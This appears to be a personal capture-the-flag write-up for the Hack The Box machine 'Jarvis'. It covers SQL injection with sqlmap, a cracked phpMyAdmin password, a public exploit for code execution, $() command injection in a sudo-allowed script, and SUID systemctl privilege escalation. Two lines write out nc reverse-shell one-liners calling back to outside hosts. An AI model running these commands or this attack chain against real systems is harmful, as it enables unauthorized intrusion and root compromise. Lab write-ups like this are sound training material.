+++
title = 'Jarvis'
description = 'Medium Linux'
writeup = true
hideMeta = true
+++

`nmap 10.129.229.137 -p- -vv -T4 -Pn --min-rate=1000 -sC`
![Jarvis (Medium).png](Jarvis%20%28Medium%29.png)
```
22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80 - HTTP - Apache httpd 2.4.25 ((Debian))
64999 - HTTP - Apache httpd 2.4.25 ((Debian))
```
Port 80:
Hotel booking page
![Jarvis (Medium)-1.png](Jarvis%20%28Medium%29-1.png)
running PHP
http://10.129.229.137/room.php?cod=5
parameters on room.php to switch room
domain name `supersecurehotel.htb` in the corner
![Jarvis (Medium)-2.png](Jarvis%20%28Medium%29-2.png)
the fuck is this:
![Jarvis (Medium)-3.png](Jarvis%20%28Medium%29-3.png)
adding supersecurehotel.htb as the domain in /etc/hosts

fuzzing both ports for
Found /images on port 80:
![Jarvis (Medium)-4.png](Jarvis%20%28Medium%29-4.png)

not much can be done tho. Another directory 'phpmyadmin'

![Jarvis (Medium)-5.png](Jarvis%20%28Medium%29-5.png)

also able to access the javascript scripts
![Jarvis (Medium)-6.png](Jarvis%20%28Medium%29-6.png)
phpMyAdmin 4.8.0 running
![Jarvis (Medium)-7.png](Jarvis%20%28Medium%29-7.png)
All the 4.8.0 exploits I see seem to require being logged in as a user - we dont have any creds

Kind of stuck, tried fuzzing subdomains, nothing there

Took a sneak peak at the walkthrough and there is possibly some injection in the way the rooms are found which we saw before
![Jarvis (Medium)-9.png](Jarvis%20%28Medium%29-9.png)
Some things stand out, cod is expecting an integer because if we put a quite then 


![Jarvis (Medium)-10.png](Jarvis%20%28Medium%29-10.png)
sqlmap finds injection - if there is an option to use boolean blind then use that

-r with request method
-u with url method

try other methods when they dont work

![Jarvis (Medium)-11.png](Jarvis%20%28Medium%29-11.png)

![Jarvis (Medium)-12.png](Jarvis%20%28Medium%29-12.png)
![Jarvis (Medium)-13.png](Jarvis%20%28Medium%29-13.png)

User: DBadmin
Password hash: \*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
Password: imissyou

![Jarvis (Medium)-14.png](Jarvis%20%28Medium%29-14.png)
This allows login into the phpMyAdmin
![Jarvis (Medium)-15.png](Jarvis%20%28Medium%29-15.png)

Looking at previous exploits, this one seems like its gonna work:
https://www.exploit-db.com/exploits/50457

It works!
![Jarvis (Medium)-16.png](Jarvis%20%28Medium%29-16.png)

`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
reliable shell
![Jarvis (Medium)-17.png](Jarvis%20%28Medium%29-17.png)
`python3 exploit.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.196 9000 >/tmp/f'`
![Jarvis (Medium)-18.png](Jarvis%20%28Medium%29-18.png)

After upgrading, running `sudo -l` shows that www-data can run simpler.py as the user pepper without a password:
![Jarvis (Medium Linux)-1.png](Jarvis%20%28Medium%20Linux%29-1.png)
Able to read python, so looking through the code we see -l runs the following function:
![Jarvis (Medium Linux)-2.png](Jarvis%20%28Medium%20Linux%29-2.png)
Here `os.system` is being run which directly runs system commands. In the "forbidden" characters, there is no $ which means we can potentially write commands inside $() and that will execute to try resolve the parameter before passing it into the ping command.
![Jarvis (Medium Linux)-3.png](Jarvis%20%28Medium%20Linux%29-3.png)
But there is no visible output seen when we run commands:
![Jarvis (Medium Linux)-4.png](Jarvis%20%28Medium%20Linux%29-4.png)
According to hacktricks ai, the shell substitution launches an interactive bash shell as pepper, however, since this is running inside os.system('ping' + command), the new shell inherits the standard input/output of the ping process, which is not a proper interactive terminal (TTY). This causes interactive commands like whoami, id, ls to produce no visible output because their stdout/stderr is not connected to the terminal.

So lets send back a reverse shell as pepper instead.
![Jarvis (Medium Linux)-5.png](Jarvis%20%28Medium%20Linux%29-5.png)
![Jarvis (Medium Linux)-6.png](Jarvis%20%28Medium%20Linux%29-6.png)
looking in the binaries folder, there are some binaries that have the setuid bit on which means the files can be run as the owner
![Jarvis (Medium Linux)-9.png](Jarvis%20%28Medium%20Linux%29-9.png)
We can see that systemctl has SUID bit set which is not normal and pepper has execute privileges.
Going to GTFO bins:
![Jarvis (Medium Linux)-10.png](Jarvis%20%28Medium%20Linux%29-10.png)
So we create a shell script containing reverse shell code.
![Jarvis (Medium Linux)-7.png](Jarvis%20%28Medium%20Linux%29-7.png)
And then create a service as shown in GTFO bins example, link the service and enable it which runs the shell.sh script and we obtain a root shell.
![Jarvis (Medium Linux)-8.png](Jarvis%20%28Medium%20Linux%29-8.png)
Root shell;
![Jarvis (Medium Linux)-11.png](Jarvis%20%28Medium%20Linux%29-11.png)
